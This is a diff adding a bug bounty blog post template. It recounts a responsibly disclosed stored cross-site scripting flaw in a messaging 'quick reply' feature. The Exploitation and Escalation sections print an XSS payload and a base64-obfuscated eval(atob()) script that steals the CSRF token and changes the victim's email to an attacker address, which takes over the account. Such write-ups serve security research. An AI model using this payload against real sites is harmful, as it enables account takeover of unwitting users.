@@ -1,0 +1,52 @@
+<div class="whitespace" style="height: 85px;"></div>
+<div class="col-12 mx-auto text-center">
+	<div class="col-8 mx-auto text-center">
+		<h3 class="title">{{ title }}</h3><br>
+	</div>
+	<div class="info">
+		<h4><a routerLink="/about">0xblackbird</a> - <span (click)="displayPublishDate()">{{ publishDate | fromNow }}</span></h4>
+	</div>
+	<img src="{{ image }}" class="img-fluid rounded img-b" draggable="false">
+</div>
+<div class="col-12 mx-auto text-left intro">
+	<p>Hello researchers! I hope you enjoy reading this post. Remember last time having found the <a routerLink="/blog/post0" target="_blank">copy&paste xss</a>, well this time, I found stored cross-site scripting that I again leveraged to (mass) account takeover.</p>
+</div>
+<div class="col-12 mx-auto text-left blog-body">
+	<h3>Target</h3>
+	<p>As you may already know, I only hunt at places where it's less crowded. The company has a responsible disclosure and wants to stay anonymous, which means that I am not allowed to disclose any information about it. All I can tell is that it has a lot of functionalities and features, which I like! I discovered the stored cross-site scripting vulnerability in one of its messaging features. I have to thank <a href="https://twitter.com/zseano" target="_blank">@zseano</a> for this one! After I finished reading <a href="https://www.bugbountyhunter.com/membership/" target="_blank">zseano's methodology</a>, I got an insight into how top hackers think when it comes to bug bounty hunting. I can't tell you how it helped me of course. But getting back to one of the target's main functionality, users can send messages to each other, but they can also forward, reply, reply to all, and quick reply to the messages they receive. After finding the <a routerLink="/blog/post0" target="_blank">copy&paste xss</a>, I thought there has to be another way to deliver malicious javascript to users. I looked at all of the features until I came across one that looked new to me. I didn't know the <span class="bold">quick reply</span> feature existed at all.</p>
+</div>
+<div class="col-12 mx-auto text-left blog-body">
+	<h3>Discovery</h3>
+	<p>Anyway, I started by sending a message to myself and made use of the quick reply feature. I inserted a simple HTML tag <code>&lt;b&gt;test</code> and sent it. Upon opening the message, I found out that everything got encoded (it was handled safely). But, what if the encoding was only done on the client-side 🧐? I inserted some random text and quick-replied it again, this time I intercepted the request, changed it, and aimed for HTML injection by trying to inject a simple HTML tag <code>&lt;b&gt;test</code>. And 'test' was displayed in bold text.
+	</p>
+</div>
+<div class="col-12 mx-auto text-left blog-body">
+	<h3>Exploitation</h3>
+	<p>Now that I have HTML injection, I went with a simple cross-site scripting payload. A payload like <code>&lt;img/src=&quot;x&quot;/onerror=&quot;alert(1)&quot;&gt;</code> was sufficient to prove cross-site scripting. So I sent that payload and bypassed the client-side filtering by using a proxy interceptor. And to my surprise, the alert box popped up when I opened the message. I successfully achieved stored cross-site scripting!
+	</p>
+</div>
+
+<div class="col-12 mx-auto text-left blog-body">
+	<h3>Escalation</h3>
+	<p>So now that we have achieved stored cross-site scripting, we have to think about the impact right? I already had a cross-site request forgery proof of concept which made it a lot easier. I encoded my exploit in base64 and executed my payload using <code>eval(atob())</code> just to get rid of all the syntax errors 😅. My final proof of concept cross-site scripting payload: 
+		<code>
+			&lt;img/src=&quot;x&quot;/onerror=&quot;eval(atob('dmFyIHJlcT1uZXcgWE1MSHR0cFJlcXVlc3QoKTt2YXIgdXJsPSIvIjt2YXIgcmVnZXg9L19jc3JmX3Rva2VuIiB2YWx1ZT0iKFteIl0qPykiL2c7cmVxLm9wZW4oIkdFVCIsdXJsLGZhbHNlKTtyZXEuc2VuZCgpO3ZhciB0b2tlbj1yZWdleC5leGVjKHJlcS5yZXNwb25zZVRleHQpO3ZhciB0b2tlbj10b2tlblsxXTtyZXEub3BlbigiUE9TVCIsdXJsLHRydWUpO3JlcS5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCJhcHBsaWNhdGlvblwveC13d3ctZm9ybS11cmxlbmNvZGVkIik7cmVxLndpdGhDcmVkZW50aWFscz10cnVlO3ZhciBib2R5PSJlbWFpbD1hdHRhY2tlckBleGFtcGxlLmNvbSZfY3NyZl90b2tlbj0iK3Rva2VuO3ZhciBhQm9keT1uZXcgVWludDhBcnJheShib2R5Lmxlbmd0aCk7Zm9yKHZhciBpPTA7aTxhQm9keS5sZW5ndGg7aSs9MSl7YUJvZHlbaV09Ym9keS5jaGFyQ29kZUF0KGkpfXJlcS5zZW5kKG5ldyBCbG9iKFthQm9keV0pKTsK'))&quot;&gt;
+		</code><br>
+		Pretty neat right? I quick-reply to someone's message and he/she ends up losing their account.</p>
+</div>
+
+<div class="col-12 mx-auto text-left blog-body">
+	<div class="space-b"></div>
+	<p><span>This was my post! I hope you learned something new from it! I reported the issue through their responsible disclosure, and it got resolved! Thanks, a lot <a href="https://twitter.com/zseano" target="_blank">@zseano</a> for your useful tips!! Your methodology is <span class="gold-box">golden!</span> Thanks all for reading! See you in the next post!</span></p>
+	<div class="whitespace"></div>
+	<div class="text-center mx-auto share">
+		<h3 class="text-center">Share this post:</h3>
+		<div class="space-b"></div>
+		<h2>
+			<a href="https://twitter.com/intent/tweet?text=The%20bug%20that%20allowed%20me%20to%20take%20over%20any%20student's%20or%20teacher's account%20by%20@0xblackbird%0A%0Ahttps://0xblackbird.github.io/%23/cG9zdDIK" target="_blank">
+				<span>Twitter </span><fa-icon class="twitter-icon" [icon]="faTwitter"></fa-icon>
+			</a>
+		</h2>
+	</div>
+</div>
+<div class="whitespace"></div>
